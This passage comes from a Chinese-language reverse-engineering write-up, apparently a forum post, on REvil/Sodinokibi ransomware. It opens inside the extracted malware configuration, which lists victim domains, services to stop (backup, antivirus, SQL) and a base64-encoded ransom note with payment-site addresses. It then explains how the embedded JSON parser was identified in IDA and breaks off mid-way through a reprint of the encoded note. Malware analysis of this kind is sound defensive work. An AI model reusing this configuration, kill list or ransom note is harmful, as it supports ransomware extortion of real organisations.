ozemondcoaching.nl;homecomingstudio.com;krcove-zily.eu;mountaintoptinyhomes.com;thedad.com;hairnetty.wordpress.com;mytechnoway.com;stoneys.ch;copystar.co.uk;trulynolen.co.uk;maratonaclubedeportugal.com;abogadosadomicilio.es;tandartspraktijkhartjegroningen.nl;kaliber.co.jp;greenko.pl;parkcf.nl;ianaswanson.com;higadograsoweb.com;highlinesouthasc.com;dushka.ua;tandartspraktijkheesch.nl;thaysa.com;rebeccarisher.com;maxadams.london;beaconhealthsystem.org;international-sound-awards.com;yousay.site;christinarebuffetcourses.com;dnepr-beskid.com.ua;wari.com.pe;blog.solutionsarchitect.guru;mrsplans.net;denifl-consulting.at;plastidip.com.ar;geoffreymeuli.com;walter-lemm.de;teknoz.net;y-archive.com;jacquin-maquettes.com;ecopro-kanto.com;tecnojobsnet.com;tanciu.com;zimmerei-deboer.de;actecfoundation.org;fiscalsort.com;tenacitytenfold.com;irinaverwer.com;jandaonline.com;appsformacpc.com;gymnasedumanagement.com;modestmanagement.com;i-arslan.de;balticdentists.com;rushhourappliances.com;lucidinvestbank.com;maineemploymentlawyerblog.com;precisionbevel.com;sexandfessenjoon.wordpress.com;yamalevents.com;firstpaymentservices.com;opatrovanie-ako.sk;thee.network;zso-mannheim.de;enovos.de;jolly-events.com;evergreen-fishing.com;vancouver-print.ca;harpershologram.wordpress.com;allure-cosmetics.at;kariokids.com;drinkseed.com;unetica.fr;kunze-immobilien.de;blacksirius.de;craigvalentineacademy.com;leather-factory.co.jp;www1.proresult.no;sportverein-tambach.de;levdittliv.se;hashkasolutindo.com;ausair.com.au;meusharklinithome.wordpress.com",
    "net":true,
    "svc":["vss",
    "veeam",
    "sophos",
    "svc$",
    "backup",
    "memtas",
    "sql",
    "mepocs"],
    "nbody":"LQAtAC0APQA9AD0AIABXAGUAbABjAG8AbQBlAC4AIABBAGcAYQBpAG4ALgAgAD0APQA9AC0ALQAtAA0ACgANAAoAWwArAF0AIABXAGgAYQB0AHMAIABIAGEAcABwAGUAbgA/ACAAWwArAF0ADQAKAA0ACgBZAG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAsACAAYQBuAGQAIABjAHUAcgByAGUAbgB0AGwAeQAgAHUAbgBhAHYAYQBpAGwAYQBiAGwAZQAuACAAWQBvAHUAIABjAGEAbgAgAGMAaABlAGMAawAgAGkAdAA6ACAAYQBsAGwAIABmAGkAbABlAHMAIABvAG4AIAB5AG8AdQByACAAYwBvAG0AcAB1AHQAZQByACAAaABhAHMAIABlAHgAdABlAG4AcwBpAG8AbgAgAHsARQBYAFQAfQAuAA0ACgBCAHkAIAB0AGgAZQAgAHcAYQB5ACwAIABlAHYAZQByAHkAdABoAGkAbgBnACAAaQBzACAAcABvAHMAcwBpAGIAbABlACAAdABvACAAcgBlAGMAbwB2AGUAcgAgACgAcgBlAHMAdABvAHIAZQApACwAIABiAHUAdAAgAHkAbwB1ACAAbgBlAGUAZAAgAHQAbwAgAGYAbwBsAGwAbwB3ACAAbwB1AHIAIABpAG4AcwB0AHIAdQBjAHQAaQBvAG4AcwAuACAATwB0AGgAZQByAHcAaQBzAGUALAAgAHkAbwB1ACAAYwBhAG4AdAAgAHIAZQB0AHUAcgBuACAAeQBvAHUAcgAgAGQAYQB0AGEAIAAoAE4ARQBWAEUAUgApAC4ADQAKAA0ACgBbACsAXQAgAFcAaABhAHQAIABnAHUAYQByAGEAbgB0AGUAZQBzAD8AIABbACsAXQANAAoADQAKAEkAdABzACAAagB1AHMAdAAgAGEAIABiAHUAcwBpAG4AZQBzAHMALgAgAFcAZQAgAGEAYgBzAG8AbAB1AHQAZQBsAHkAIABkAG8AIABuAG8AdAAgAGMAYQByAGUAIABhAGIAbwB1AHQAIAB5AG8AdQAgAGEAbgBkACAAeQBvAHUAcgAgAGQAZQBhAGwAcwAsACAAZQB4AGMAZQBwAHQAIABnAGUAdAB0AGkAbgBnACAAYgBlAG4AZQBmAGkAdABzAC4AIABJAGYAIAB3AGUAIABkAG8AIABuAG8AdAAgAGQAbwAgAG8AdQByACAAdwBvAHIAawAgAGEAbgBkACAAbABpAGEAYgBpAGwAaQB0AGkAZQBzACAALQAgAG4AbwBiAG8AZAB5ACAAdwBpAGwAbAAgAG4AbwB0ACAAYwBvAG8AcABlAHIAYQB0AGUAIAB3AGkAdABoACAAdQBzAC4AIABJAHQAcwAgAG4AbwB0ACAAaQBuACAAbwB1AHIAIABpAG4AdABlAHIAZQBzAHQAcwAuAA0ACgBUAG8AIABjAGgAZQBjAGsAIAB0AGgAZQAgAGEAYgBpAGwAaQB0AHkAIABvAGYAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGYAaQBsAGUAcwAsACAAWQBvAHUAIABzAGgAbwB1AGwAZAAgAGcAbwAgAHQAbwAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQAuACAAVABoAGUAcgBlACAAeQBvAHUAIABjAGEAbgAgAGQAZQBjAHIAeQBwAHQAIABvAG4AZQAgAGYAaQBsAGUAIABmAG8AcgAgAGYAcgBlAGUALgAgAFQAaABhAHQAIABpAHMAIABvAHUAcgAgAGcAdQBhAHIAYQBuAHQAZQBlAC4ADQAKAEkAZgAgAHkAbwB1ACAAdwBpAGwAbAAgAG4AbwB0ACAAYwBvAG8AcABlAHIAYQB0AGUAIAB3AGkAdABoACAAbwB1AHIAIABzAGUAcgB2AGkAYwBlACAALQAgAGYAbwByACAAdQBzACwAIABpAHQAcwAgAGQAbwBlAHMAIABuAG8AdAAgAG0AYQB0AHQAZQByAC4AIABCAHUAdAAgAHkAbwB1ACAAdwBpAGwAbAAgAGwAbwBzAGUAIAB5AG8AdQByACAAdABpAG0AZQAgAGEAbgBkACAAZABhAHQAYQAsACAAYwBhAHUAcwBlACAAagB1AHMAdAAgAHcAZQAgAGgAYQB2AGUAIAB0AGgAZQAgAHAAcgBpAHYAYQB0AGUAIABrAGUAeQAuACAASQBuACAAcAByAGEAYwB0AGkAcwBlACAALQAgAHQAaQBtAGUAIABpAHMAIABtAHUAYwBoACAAbQBvAHIAZQAgAHYAYQBsAHUAYQBiAGwAZQAgAHQAaABhAG4AIABtAG8AbgBlAHkALgANAAoADQAKAEkAIABzAHUAZwBnAGUAcwB0ACAAeQBvAHUAIAByAGUAYQBkACAAYQBiAG8AdQB0ACAAdQBzACAAbwBuACAAdABoAGUAIABJAG4AdABlAHIAbgBlAHQALAAgAHcAZQAgAGEAcgBlACAAawBuAG8AdwBuACAAYQBzACAAIgBTAG8AZABpAG4AbwBrAGkAYgBpACAAUgBhAG4AcwBvAG0AdwBhAHIAZQAiAC4AIABGAG8AcgAgAGUAeABhAG0AcABsAGUALAAgAHQAaABpAHMAIABhAHIAdABpAGMAbABlADoADQAKAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAGMAbwB2AGUAdwBhAHIAZQAuAGMAbwBtAC8AYgBsAG8AZwAvADIAMAAxADkALwA3AC8AMQA1AC8AcgBhAG4AcwBvAG0AdwBhAHIAZQAtAGEAbQBvAHUAbgB0AHMALQByAGkAcwBlAC0AMwB4AC0AaQBuAC0AcQAyAC0AYQBzAC0AcgB5AHUAawAtAGEAbQBwAC0AcwBvAGQAaQBuAG8AawBpAGIAaQAtAHMAcAByAGUAYQBkAA0ACgBQAGEAeQAgAGEAdAB0AGUAbgB0AGkAbwBuACAAdABvACAAdABoAGEAdAA6AA0ACgAiAEgAbwB3ACAATQB1AGMAaAAgAEQAYQB0AGEAIABJAHMAIABEAGUAYwByAHkAcAB0AGUAZAAgAHcAaQB0AGgAIABhACAAUgBhAG4AcwBvAG0AdwBhAHIAZQAgAEQAZQBjAHIAeQBwAHQAbwByAD8ADQAKAA0ACgBJAG4AIABRADIAIAAyADAAMQA5ACwAIAB2AGkAYwB0AGkAbQBzACAAdwBoAG8AIABwAGEAaQBkACAAZgBvAHIAIABhACAAZABlAGMAcgB5AHAAdABvAHIAIAByAGUAYwBvAHYAZQByAGUAZAAgADkAMgAlACAAbwBmACAAdABoAGUAaQByACAAZQBuAGMAcgB5AHAAdABlAGQAIABkAGEAdABhAC4AIABUAGgAaQBzACAAcwB0AGEAdABpAHMAdABpAGMAIAB2AGEAcgBpAGUAZAAgAGQAcgBhAG0AYQB0AGkAYwBhAGwAbAB5ACAAZABlAHAAZQBuAGQAaQBuAGcAIABvAG4AIAB0AGgAZQAgAHIAYQBuAHMAbwBtAHcAYQByAGUAIAB0AHkAcABlAC4AIAANAAoARgBvAHIAIABlAHgAYQBtAHAAbABlACwAIABSAHkAdQBrACAAcgBhAG4AcwBvAG0AdwBhAHIAZQAgAGgAYQBzACAAYQAgAHIAZQBsAGEAdABpAHYAZQBsAHkAIABsAG8AdwAgAGQAYQB0AGEAIAByAGUAYwBvAHYAZQByAHkAIAByAGEAdABlACwAIABhAHQAIAB+ACAAOAA3ACUALAAgAHcAaABpAGwAZQAgAFMAbwBkAGkAbgBvAGsAaQBiAGkAIAB3AGEAcwAgAGMAbABvAHMAZQAgAHQAbwAgADEAMAAwACUALgAgACIADQAKAA0ACgBOAG8AdwAgAHkAbwB1ACAAaABhAHYAZQAgAGEAIABnAHUAYQByAGEAbgB0AGUAZQAgAHQAaABhAHQAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAdwBpAGwAbAAgAGIAZQAgAHIAZQB0AHUAcgBuAGUAZAAgADEAMAAwACAAJQAuAA0ACgANAAoAWwArAF0AIABIAG8AdwAgAHQAbwAgAGcAZQB0ACAAYQBjAGMAZQBzAHMAIABvAG4AIAB3AGUAYgBzAGkAdABlAD8AIABbACsAXQANAAoADQAKAFkAbwB1ACAAaABhAHYAZQAgAHQAdwBvACAAdwBhAHkAcwA6AA0ACgANAAoAMQApACAAWwBSAGUAYwBvAG0AbQBlAG4AZABlAGQAXQAgAFUAcwBpAG4AZwAgAGEAIABUAE8AUgAgAGIAcgBvAHcAcwBlAHIAIQANAAoAIAAgAGEAKQAgAEQAbwB3AG4AbABvAGEAZAAgAGEAbgBkACAAaQBuAHMAdABhAGwAbAAgAFQATwBSACAAYgByAG8AdwBzAGUAcgAgAGYAcgBvAG0AIAB0AGgAaQBzACAAcwBpAHQAZQA6ACAAaAB0AHQAcABzADoALwAvAHQAbwByAHAAcgBvAGoAZQBjAHQALgBvAHIAZwAvAA0ACgAgACAAYgApACAATwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBhAHAAbABlAGIAegB1ADQANwB3AGcAYQB6AGEAcABkAHEAawBzADYAdgByAGMAdgA2AHoAYwBuAGoAcABwAGsAYgB4AGIAcgA2AHcAawBlAHQAZgA1ADYAbgBmADYAYQBxADIAbgBtAHkAbwB5AGQALgBvAG4AaQBvAG4ALwB7AFUASQBEAH0ADQAKAA0ACgAyACkAIABJAGYAIABUAE8AUgAgAGIAbABvAGMAawBlAGQAIABpAG4AIAB5AG8AdQByACAAYwBvAHUAbgB0AHIAeQAsACAAdAByAHkAIAB0AG8AIAB1AHMAZQAgAFYAUABOACEAIABCAHUAdAAgAHkAbwB1ACAAYwBhAG4AIAB1AHMAZQAgAG8AdQByACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlAC4AIABGAG8AcgAgAHQAaABpAHMAOgANAAoAIAAgAGEAKQAgAE8AcABlAG4AIAB5AG8AdQByACAAYQBuAHkAIABiAHIAbwB3AHMAZQByACAAKABDAGgAcgBvAG0AZQAsACAARgBpAHIAZQBmAG8AeAAsACAATwBwAGUAcgBhACwAIABJAEUALAAgAEUAZABnAGUAKQANAAoAIAAgAGIAKQAgAE8AcABlAG4AIABvAHUAcgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBkAGUAYwByAHkAcAB0AG8AcgAuAGMAYwAvAHsAVQBJAEQAfQANAAoADQAKAFcAYQByAG4AaQBuAGcAOgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQAgAGMAYQBuACAAYgBlACAAYgBsAG8AYwBrAGUAZAAsACAAdABoAGEAdABzACAAdwBoAHkAIABmAGkAcgBzAHQAIAB2AGEAcgBpAGEAbgB0ACAAbQB1AGMAaAAgAGIAZQB0AHQAZQByACAAYQBuAGQAIABtAG8AcgBlACAAYQB2AGEAaQBsAGEAYgBsAGUALgAgAEkAZgAgAHkAbwB1ACAAaABhAHYAZQAgAHAAcgBvAGIAbABlAG0AIAB3AGkAdABoACAAYwBvAG4AbgBlAGMAdAAsACAAdQBzAGUAIABzAHQAcgBpAGMAdABsAHkAIABUAE8AUgAgAHYAZQByAHMAaQBvAG4AIAA4AC4ANQAuADUADQAKAGwAaQBuAGsAIABmAG8AcgAgAGQAbwB3AG4AbABvAGEAZAAgAFQATwBSACAAdgBlAHIAcwBpAG8AbgAgADgALgA1AC4ANQAgAGgAZQByAGUAOgAgAGgAdAB0AHAAcwA6AC8ALwBmAGkAbABlAGgAaQBwAHAAbwAuAGMAbwBtAC8AZABvAHcAbgBsAG8AYQBkAF8AdABvAHIAXwBiAHIAbwB3AHMAZQByAF8AZgBvAHIAXwB3AGkAbgBkAG8AdwBzAC8AIAANAAoADQAKAFcAaABlAG4AIAB5AG8AdQAgAG8AcABlAG4AIABvAHUAcgAgAHcAZQBiAHMAaQB0AGUALAAgAHAAdQB0ACAAdABoAGUAIABmAG8AbABsAG8AdwBpAG4AZwAgAGQAYQB0AGEAIABpAG4AIAB0AGgAZQAgAGkAbgBwAHUAdAAgAGYAbwByAG0AOgANAAoASwBlAHkAOgANAAoADQAKAHsASwBFAFkAfQANAAoADQAKAA0ACgBFAHgAdABlAG4AcwBpAG8AbgAgAG4AYQBtAGUAOgANAAoADQAKAHsARQBYAFQAfQANAAoADQAKAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQANAAoAcABvAHMAdABzAGMAcgBpAHAAdAA6ACAASQBuACAAYwBhAHMAZQAgAHkAbwB1ACAAdwBhAG4AdAAgAHQAbwAgAGkAbgBkAGUAcABlAG4AZABlAG4AdABsAHkAIABkAGUAYwByAHkAcAB0ACAAeQBvAHUAcgAgAHMAZQByAHYAZQByAHMALAAgAHcAZQAgAHcAaQBsAGwAIABiAGUAIABmAG8AcgBjAGUAZAAgAHQAbwAgAHAAdQB0ACAAdABoAGUAIABkAGEAdABhAGIAYQBzAGUAcwAgAG8AZgAgAHkAbwB1AHIAIABjAG8AbQBwAGEAbgBpAGUAcwAgAGkAbgAgAHQAaABlACAAcAB1AGIAbABpAGMAIABkAG8AbQBhAGkAbgAuACAATQBEAEYAIABmAGkAbABlAHMAOgANAAoARABCAF8AVQBUAEkATABJAFQAWQANAAoATABlAGEAcwBlAFAAbAB1AHMADQAKAEwAUABTAGUAYwB1AHIAaQB0AHkADQAKAEwAVABTAGgAYQByAGUAZAANAAoAUABhAHAAZQByAFYAaQBzAGkAbwBuAA0ACgANAAoAIQAhACEAIABEAEEATgBHAEUAUgAgACEAIQAhAA0ACgBEAE8ATgBUACAAdAByAHkAIAB0AG8AIABjAGgAYQBuAGcAZQAgAGYAaQBsAGUAcwAgAGIAeQAgAHkAbwB1AHIAcwBlAGwAZgAsACAARABPAE4AVAAgAHUAcwBlACAAYQBuAHkAIAB0AGgAaQByAGQAIABwAGEAcgB0AHkAIABzAG8AZgB0AHcAYQByAGUAIABmAG8AcgAgAHIAZQBzAHQAbwByAGkAbgBnACAAeQBvAHUAcgAgAGQAYQB0AGEAIABvAHIAIABhAG4AdABpAHYAaQByAHUAcwAgAHMAbwBsAHUAdABpAG8AbgBzACAALQAgAGkAdABzACAAbQBhAHkAIABlAG4AdABhAGkAbAAgAGQAYQBtAGcAZQAgAG8AZgAgAHQAaABlACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5ACAAYQBuAGQALAAgAGEAcwAgAHIAZQBzAHUAbAB0ACwAIABUAGgAZQAgAEwAbwBzAHMAIABhAGwAbAAgAGQAYQB0AGEALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAA0ACgBPAE4ARQAgAE0ATwBSAEUAIABUAEkATQBFADoAIABJAHQAcwAgAGkAbgAgAHkAbwB1AHIAIABpAG4AdABlAHIAZQBzAHQAcwAgAHQAbwAgAGcAZQB0ACAAeQBvAHUAcgAgAGYAaQBsAGUAcwAgAGIAYQBjAGsALgAgAEYAcgBvAG0AIABvAHUAcgAgAHMAaQBkAGUALAAgAHcAZQAgACgAdABoAGUAIABiAGUAcwB0ACAAcwBwAGUAYwBpAGEAbABpAHMAdABzACkAIABtAGEAawBlACAAZQB2AGUAcgB5AHQAaABpAG4AZwAgAGYAbwByACAAcgBlAHMAdABvAHIAaQBuAGcALAAgAGIAdQB0ACAAcABsAGUAYQBzAGUAIABzAGgAbwB1AGwAZAAgAG4AbwB0ACAAaQBuAHQAZQByAGYAZQByAGUALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAAAA",
    "nname":"{ 
    EXT}-readme.txt",
    "exp":false,
    "img":"LQAtAC0APQA9AD0AIABTAG8AZABpAG4AbwBrAGkAYgBpACAAUgBhAG4AcwBvAG0AdwBhAHIAZQAgAD0APQA9AC0ALQAtAA0ACgANAAoAQQBsAGwAIABvAGYAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAhAA0ACgANAAoARgBpAG4AZAAgAHsARQBYAFQAfQAtAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABhAG4AZAAgAGYAbwBsAGwAbwB3ACAAaQBuAHMAdAB1AGMAdABpAG8AbgBzAAAA",
    "arn":false}

```

#### 解析配置结构体

继续分析可以发现以下解密字符串，类似于配置信息字段。

![](https://bbs.pediy.com/upload/attach/202105/784955_SVBASUMGH6KKK4Z.jpg)

继续向下看，发现字符串全部填入了如下的数组中。

![](https://bbs.pediy.com/upload/attach/202105/784955_PFZ2GYBTHEBFAU4.jpg)

继续观察数组内容，可以发现一个规律每填充 3 个字段，填充的数序类型就会重新循环。拿如下的截图举例。

![](https://bbs.pediy.com/upload/attach/202105/784955_GM72PJ589F8CRQ5.jpg)

根据次规律可以设置结构体如下

```
struct  mv_config_stru
{
  DWORD field_name;
  DWORD unknown;
  DWORD parse_function;
};

```

由于 IDA 帮我们解引用出最大索引为 44，所以实际 4 字节元素为 45 个。再除以 3 可以得到结构体为 15 个。定义结构体数组如下。IDA 定义结构体数组的方法可以参考我的另一篇文章 [https://bbs.pediy.com/thread-266419.htm](https://bbs.pediy.com/thread-266419.htm)。

![](https://bbs.pediy.com/upload/attach/202105/784955_YFWGBW66RH3EAVC.jpg)

重新解析后的结构体数组如下。

![](https://bbs.pediy.com/upload/attach/202105/784955_JDN6GJAUX68H4KF.jpg)

我们可以发现比较可疑的是 unknown 字段和对应的函数不相同。而且我们可以看到 unknown 字段的值类似一个宏，可以通过不同的宏代表不同的结构体数据类型。根据查询资料得知 REvil 家族使用的配置方式是在恶意程序内部配置一个内嵌的 JSON 数据解析器，这种内嵌解析器的方式一半来自开源代码，因为病毒作者为了节省开发效率很少会自己开发解析器。使用 Google 查询开源项目，可以看到 C 实现的 JSON 解析器开源项目我们可以通过比较开源项目中的数据定义猜测使用了哪种 JSON 解析器

![](https://bbs.pediy.com/upload/attach/202105/784955_TWS9C268R4PQ6AU.jpg)

从第一个 cJSON 开源程序代码中可以看到定义如下

![](https://bbs.pediy.com/upload/attach/202105/784955_E7Z8PHFNBK2MB5B.jpg)

```
/* cJSON Types: */
#define cJSON_Invalid (0)
#define cJSON_False  (1 << 0)    //1
#define cJSON_True   (1 << 1)   //2
#define cJSON_NULL   (1 << 2)   //4
#define cJSON_Number (1 << 3) //8
#define cJSON_String (1 << 4) //16
#define cJSON_Array  (1 << 5)    //32
#define cJSON_Object (1 << 6) //64
#define cJSON_Raw    (1 << 7) /* raw json */   //128

```

第二个 json-parser 开源代码中 Types 如下

![](https://bbs.pediy.com/upload/attach/202105/784955_2Y9C25YHJDWUZWD.jpg)

```
typedef enum
{
   json_none,    //0
   json_object,  //1
   json_array,   //2
   json_integer,//3
   json_double,  //4
   json_string,  //5
   json_boolean,//6
   json_null //7
 
} json_type;

```

我们观察 type 的值都处于 0~7 的常量范围内，则假设使用的是 json-parser 的开源项目。将 Enum 结构体添加进入 IDA，让 IDA 解析出类型后通过后续分析验证是否正确。

![](https://bbs.pediy.com/upload/attach/202105/784955_R8RDKZ7CQNK8KMV.jpg)

跟进函数 sub_40ADB3 进行分析，通过观察比较后续行为与 json-parser 的解密一致，所以可以确定使用了该开源的内嵌 CJSON 解析器执行逻辑。我们可以大致推测后续行为通过内嵌的 CJSON 解析器将勒索信内容呈现给受害者。源码与反汇编伪代码对比。

![](https://bbs.pediy.com/upload/attach/202105/784955_R8T5MGAX2JCSR5X.jpg)

#### 支付页面解析

接下来我们仔细观察配置文件，可以看到有一大段不能理解的编码嵌入在配置文件中实际为 Base64 编码的数据

![](https://bbs.pediy.com/upload/attach/202105/784955_GMMDKF8CZT3ETK7.jpg)

nbody 数据

```
"LQAtAC0APQA9AD0AIABXAGUAbABjAG8AbQBlAC4AIABBAGcAYQBpAG4ALgAgAD0APQA9AC0ALQAtAA0ACgANAAoAWwArAF0AIABXAGgAYQB0AHMAIABIAGEAcABwAGUAbgA/ACAAWwArAF0ADQAKAA0ACgBZAG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAsACAAYQBuAGQAIABjAHUAcgByAGUAbgB0AGwAeQAgAHUAbgBhAHYAYQBpAGwAYQBiAGwAZQAuACAAWQBvAHUAIABjAGEAbgAgAGMAaABlAGMAawAgAGkAdAA6ACAAYQBsAGwAIABmAGkAbABlAHMAIABvAG4AIAB5AG8AdQByACAAYwBvAG0AcAB1AHQAZQByACAAaABhAHMAIABlAHgAdABlAG4AcwBpAG8AbgAgAHsARQBYAFQAfQAuAA0ACgBCAHkAIAB0AGgAZQAgAHcAYQB5ACwAIABlAHYAZQByAHkAdABoAGkAbgBnACAAaQBzACAAcABvAHMAcwBpAGIAbABlACAAdABvACAAcgBlAGMAbwB2AGUAcgAgACgAcgBlAHMAdABvAHIAZQApACwAIABiAHUAdAAgAHkAbwB1ACAAbgBlAGUAZAAgAHQAbwAgAGYAbwBsAGwAbwB3ACAAbwB1AHIAIABpAG4AcwB0AHIAdQBjAHQAaQBvAG4AcwAuACAATwB0AGgAZQByAHcAaQBzAGUALAAgAHkAbwB1ACAAYwBhAG4AdAAgAHIAZQB0AHUAcgBuACAAeQBvAHUAcgAgAGQAYQB0AGEAIAAoAE4ARQBWAEUAUgApAC4ADQAKAA0ACgBbACsAXQAgAFcAaABhAHQAIABnAHUAYQByAGEAbgB0AGUAZQBzAD8AIABbACsAXQANAAoADQAKAEkAdABzACAAagB1AHMAdAAgAGEAIABiAHUAcwBpAG4AZQBzAHMALgAgAFcAZQAgAGEAYgBzAG8AbAB1AHQAZQBsAHkAIABkAG8AIABuAG8AdAAgAGMAYQByAGUAIABhAGIAbwB1AHQAIAB5AG8AdQAgAGEAbgBkACAAeQBvAHUAcgAgAGQAZQBhAGwAcwAsACAAZQB4AGMAZQBwAHQAIABnAGUAdAB0AGkAbgBnACAAYgBlAG4AZQBmAGkAdABzAC4AIABJAGYAIAB3AGUAIABkAG8AIABuAG8AdAAgAGQAbwAgAG8AdQByACAAdwBvAHIAawAgAGEAbgBkACAAbABpAGEAYgBpAGwAaQB0AGkAZQBzACAALQAgAG4AbwBiAG8AZAB5ACAAdwBpAGwAbAAgAG4AbwB0ACAAYwBvAG8AcABlAHIAYQB0AGUAIAB3AGkAdABoACAAdQBzAC4AIABJAHQAcwAgAG4AbwB0ACAAaQBuACAAbwB1AHIAIABpAG4AdABlAHIAZQBzAHQAcwAuAA0ACgBUAG8AIABjAGgAZQBjAGsAIAB0AGgAZQAgAGEAYgBpAGwAaQB0AHkAIABvAGYAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGYAaQBsAGUAcwAsACAAWQBvAHUAIABzAGgAbwB1AGwAZAAgAGcAbwAgAHQAbwAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQAuACAAVABoAGUAcgBlACAAeQBvAHUAIABjAGEAbgAgAGQAZQBjAHIAeQBwAHQAIABvAG4AZQAgAGYAaQBsAGUAIABmAG8AcgAgAGYAcgBlAGUALgAgAFQAaABhAHQAIABpAHMAIABvAHUAcgAgAGcAdQBhAHIAYQBuAHQAZQBlAC4ADQAKAEkAZgAgAHkAbwB1ACAAdwBpAGwAbAAgAG4AbwB0ACAAYwBvAG8AcABlAHIAYQB0AGUAIAB3AGkAdABoACAAbwB1AHIAIABzAGUAcgB2AGkAYwBlACAALQAgAGYAbwByACAAdQBzACwAIABpAHQAcwAgAGQAbwBlAHMAIABuAG8AdAAgAG0AYQB0AHQAZQByAC4AIABCAHUAdAAgAHkAbwB1ACAAdwBpAGwAbAAgAGwAbwBzAGUAIAB5AG8AdQByACAAdABpAG0AZQAgAGEAbgBkACAAZABhAHQAYQAsACAAYwBhAHUAcwBlACAAagB1AHMAdAAgAHcAZQAgAGgAYQB2AGUAIAB0AGgAZQAgAHAAcgBpAHYAYQB0AGUAIABrAGUAeQAuACAASQBuACAAcAByAGEAYwB0AGkAcwBlACAALQAgAHQAaQBtAGUAIABpAHMAIABtAHUAYwBoACAAbQBvAHIAZQAgAHYAYQBsAHUAYQBiAGwAZQAgAHQAaABhAG4AIABtAG8AbgBlAHkALgANAAoADQAKAEkAIABzAHUAZwBnAGUAcwB0ACAAeQBvAHUAIAByAGUAYQBkACAAYQBiAG8AdQB0ACAAdQBzACAAbwBuACAAdABoAGUAIABJAG4AdABlAHIAbgBlAHQALAAgAHcAZQAgAGEAcgBlACAAawBuAG8AdwBuACAAYQBzACAAIgBTAG8AZABpAG4AbwBrAGkAYgBpACAAUgBhAG4AcwBvAG0AdwBhAHIAZQAiAC4AIABGAG8AcgAgAGUAeABhAG0AcABsAGUALAAgAHQAaABpAHMAIABhAHIAdABpAGMAbABlADoADQAKAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAGMAbwB2AGUAdwBhAHIAZQAuAGMAbwBtAC8AYgBsAG8AZwAvADIAMAAxADkALwA3AC8AMQA1AC8AcgBhAG4AcwBvAG0AdwBhAHIAZQAtAGEAbQBvAHUAbgB0AHMALQByAGkAcwBlAC0AMwB4AC0AaQBuAC0AcQAyAC0AYQBzAC0AcgB5AHUAawAtAGEAbQBwAC0AcwBvAGQAaQBuAG8AawBpAGIAaQAtAHMAcAByAGUAYQBkAA0ACgBQAGEAeQAgAGEAdAB0AGUAbgB0AGkAbwBuACAAdABvACAAdABoAGEAdAA6AA0ACgAiAEgAbwB3ACAATQB1AGMAaAAgAEQAYQB0AGEAIABJAHMAIABEAGUAYwByAHkAcAB0AGUAZAAgAHcAaQB0AGgAIABhACAAUgBhAG4AcwBvAG0AdwBhAHIAZQAgAEQAZQBjAHIAeQBwAHQAbwByAD8ADQAKAA0ACgBJAG4AIABRADIAIAAyADAAMQA5ACwAIAB2AGkAYwB0AGkAbQBzACAAdwBoAG8AIABwAGEAaQBkACAAZgBvAHIAIABhACAAZABlAGMAcgB5AHAAdABvAHIAIAByAGUAYwBvAHYAZQByAGUAZAAgADkAMgAlACAAbwBmACAAdABoAGUAaQByACAAZQBuAGMAcgB5AHAAdABlAGQAIABkAGEAdABhAC4AIABUAGgAaQBzACAAcwB0AGEAdABpAHMAdABpAGMAIAB2AGEAcgBpAGUAZAAgAGQAcgBhAG0AYQB0AGkAYwBhAGwAbAB5ACAAZABlAHAAZQBuAGQAaQBuAGcAIABvAG4AIAB0AGgAZQAgAHIAYQBuAHMAbwBtAHcAYQByAGUAIAB0AHkAcABlAC4AIAANAAoARgBvAHIAIABlAHgAYQBtAHAAbABlACwAIABSAHkAdQBrACAAcgBhAG4AcwBvAG0AdwBhAHIAZQAgAGgAYQBzACAAYQAgAHIAZQBsAGEAdABpAHYAZQBsAHkAIABsAG8AdwAgAGQAYQB0AGEAIAByAGUAYwBvAHYAZQByAHkAIAByAGEAdABlACwAIABhAHQAIAB+ACAAOAA3ACUALAAgAHcAaABpAGwAZQAgAFMAbwBkAGkAbgBvAGsAaQBiAGkAIAB3AGEAcwAgAGMAbABvAHMAZQAgAHQAbwAgADEAMAAwACUALgAgACIADQAKAA0ACgBOAG8AdwAgAHkAbwB1ACAAaABhAHYAZQAgAGEAIABnAHUAYQByAGEAbgB0AGUAZQAgAHQAaABhAHQAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAdwBpAGwAbAAgAGIAZQAgAHIAZQB0AHUAcgBuAGUAZAAgADEAMAAwACAAJQAuAA0ACgANAAoAWwArAF0AIABIAG8AdwAgAHQAbwAgAGcAZQB0ACAAYQBjAGMAZQBzAHMAIABvAG4AIAB3AGUAYgBzAGkAdABlAD8AIABbACsAXQANAAoADQAKAFkAbwB1ACAAaABhAHYAZQAgAHQAdwBvACAAdwBhAHkAcwA6AA0ACgANAAoAMQApACAAWwBSAGUAYwBvAG0AbQBlAG4AZABlAGQAXQAgAFUAcwBpAG4AZwAgAGEAIABUAE8AUgAgAGIAcgBvAHcAcwBlAHIAIQANAAoAIAAgAGEAKQAgAEQAbwB3AG4AbABvA